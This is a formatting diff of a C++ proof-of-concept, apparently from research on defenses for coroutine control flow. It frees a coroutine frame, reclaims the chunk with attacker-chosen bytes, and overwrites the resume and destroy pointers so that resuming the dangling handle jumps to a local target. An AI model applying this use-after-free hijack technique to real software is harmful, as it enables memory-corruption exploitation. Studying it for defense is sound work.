@@ -15,6 +15,7 @@
  * deterministic in-process (tcache returns the just-freed chunk).
  */
 #include "cfop_common.h"
+
 #include <cstdlib>
 
 static Task worker() {
@@ -24,37 +25,48 @@ static Task worker() {
 }
 
 int main() {
-    fprintf(stderr, "=== CFOP Primitive 2: Use-After-Free reclaim (in-process) ===\n");
+    fprintf(stderr,
+            "=== CFOP Primitive 2: Use-After-Free reclaim (in-process) ===\n");
 
     // 1. Victim creates and parks a coroutine.
     Task t = worker();
-    t.handle.resume();                       // parked at the co_await
-    void  *frame = t.handle.address();
-    size_t sz    = chunk_size(frame);
-    fprintf(stderr, "[VICTIM] frame=%p usable=%zu legit resume_fn=%p\n",
-            frame, sz, frame_resume(frame));
+    t.handle.resume(); // parked at the co_await
+    void *frame = t.handle.address();
+    size_t sz = chunk_size(frame);
+    fprintf(stderr,
+            "[VICTIM] frame=%p usable=%zu legit resume_fn=%p\n",
+            frame,
+            sz,
+            frame_resume(frame));
 
     // 2. BUG: the frame is destroyed (freed) but a handle to it is kept.
-    auto dangling = t.handle;                // stale copy of the handle
-    t.handle = nullptr;                      // stop ~Task from destroying again
-    dangling.destroy();                      // frame chunk returns to the allocator
-    fprintf(stderr, "[VICTIM] (bug) frame freed; dangling handle still held\n");
+    auto dangling = t.handle; // stale copy of the handle
+    t.handle = nullptr;       // stop ~Task from destroying again
+    dangling.destroy();       // frame chunk returns to the allocator
+    fprintf(stderr,
+            "[VICTIM] (bug) frame freed; dangling handle still held\n");
 
     // 3. ATTACKER: the next same-size allocation reclaims the freed chunk, and
     //    its bytes are attacker-controlled — here, a fake frame.
     char *reclaim = new char[sz];
-    fprintf(stderr, "[ATTACKER] reclaim=%p %s\n", reclaim,
-            reclaim == frame ? "(== freed frame, reclaimed)" : "(did NOT reclaim!)");
+    fprintf(stderr,
+            "[ATTACKER] reclaim=%p %s\n",
+            reclaim,
+            reclaim == frame ? "(== freed frame, reclaimed)"
+                             : "(did NOT reclaim!)");
     void *tgt = (void *)&hijack_target;
-    memcpy(reclaim + 0, &tgt, 8);            // fake resume_fn
-    memcpy(reclaim + 8, &tgt, 8);            // fake destroy_fn
-    fprintf(stderr, "[ATTACKER] planted hijack_target in reclaimed frame[0]/[8]\n");
+    memcpy(reclaim + 0, &tgt, 8); // fake resume_fn
+    memcpy(reclaim + 8, &tgt, 8); // fake destroy_fn
+    fprintf(stderr,
+            "[ATTACKER] planted hijack_target in reclaimed frame[0]/[8]\n");
 
     // 4. Victim resumes the dangling handle -> indirect call through frame[0].
     fprintf(stderr, "[VICTIM] resuming dangling handle...\n");
-    dangling.resume();                       // -> hijack_target on the vulnerable build
+    dangling.resume(); // -> hijack_target on the vulnerable build
 
-    fprintf(stderr, "[VICTIM] survived (a defense neutralized or aborted the hijack)\n");
+    fprintf(
+        stderr,
+        "[VICTIM] survived (a defense neutralized or aborted the hijack)\n");
     delete[] reclaim;
     return 0;
 }
